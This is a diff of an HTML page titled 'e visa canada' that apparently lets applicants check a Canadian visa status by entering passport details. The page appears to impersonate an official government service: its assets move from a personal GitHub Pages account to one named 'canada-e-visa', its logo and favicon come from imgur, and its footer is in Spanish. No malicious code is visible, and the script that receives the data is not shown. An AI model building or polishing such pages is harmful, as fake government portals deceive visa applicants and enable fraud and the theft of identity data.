@@ -4,8 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>e visa canada</title>
-  <link rel="stylesheet" href="https://ihab7655.github.io/cana/styles.css">
-  <link rel="stylesheet" href="https://ihab7655.github.io/cana/loader.css">
+  <link rel="stylesheet" href="https://canada-e-visa.github.io/cana/styles.css">
+  <link rel="stylesheet" href="https://canada-e-visa.github.io/cana/loader.css">
+  <link rel="icon" href="https://i.imgur.com/Y18mhHE.jpeg" type="image/x-icon">
+
 </head>
 <body>
   <!-- شاشة التحميل -->
@@ -16,7 +18,7 @@
 
   <!-- المحتوى الرئيسي -->
   <header>
-    <p aria-label="Important notice">Provide all correct and truthful information. Omission of information or false information may result in your visa being refused.</p>
+    <p aria-label="Important notice">All information must be entered correctly in the verification table fields. Entering incorrect information may result in no results.</p>
   </header>
   <div class="logo">
     <img src="https://i.imgur.com/aQQeebm.png" alt="eVisa Immigration Logo">
@@ -65,16 +67,28 @@
 
       <label for="issueDate" class="required">date of issue of passport</label>
       <div class="date-container">
-        <input type="text" id="issueDay" name="issueDay" placeholder="Day(DD)" required class="date-field">
-        <input type="text" id="issueMonth" name="issueMonth" placeholder="Month(MM)" required class="date-field">
-        <input type="text" id="issueYear" name="issueYear" placeholder="Year(YYYY)" required class="date-field">
+        <select id="issueDay" name="issueDay" required class="date-field">
+          <option value="">Please select</option>
+        </select>
+        <select id="issueMonth" name="issueMonth" required class="date-field">
+          <option value="">Please select</option>
+        </select>
+        <select id="issueYear" name="issueYear" required class="date-field">
+          <option value="">Please select</option>
+        </select>
       </div>
 
       <label for="expiryDate" class="required">date of expiry of passport</label>
       <div class="date-container">
-        <input type="text" id="expiryDay" name="expiryDay" placeholder="Day(DD)" required class="date-field">
-        <input type="text" id="expiryMonth" name="expiryMonth" placeholder="Month(MM)" required class="date-field">
-        <input type="text" id="expiryYear" name="expiryYear" placeholder="Year(YYYY)" required class="date-field">
+        <select id="expiryDay" name="expiryDay" required class="date-field">
+          <option value="">Please select</option>
+        </select>
+        <select id="expiryMonth" name="expiryMonth" required class="date-field">
+          <option value="">Please select</option>
+        </select>
+        <select id="expiryYear" name="expiryYear" required class="date-field">
+          <option value="">Please select</option>
+        </select>
       </div>
 
       <button type="button" onclick="checkStatus()">check status</button>
@@ -110,10 +124,10 @@
     <p id="errorMessage" style="display: none;">Sorry, no request matches this information..</p>
   </main>
   <footer>
-    <p>&copy;  2024 Electronic Travel e-visa - Canada. Todos los derechos reservados.</p>
+    <p>&copy; 2024 Electronic Travel e-visa - Canada. Todos los derechos reservados.</p>
   </footer>
 
   <!-- تضمين رابط لملف JavaScript -->
-  <script src="https://ihab7655.github.io/cana/script.js"></script>
+  <script src="https://canada-e-visa.github.io/cana/script.js"></script>
 </body>
 </html>
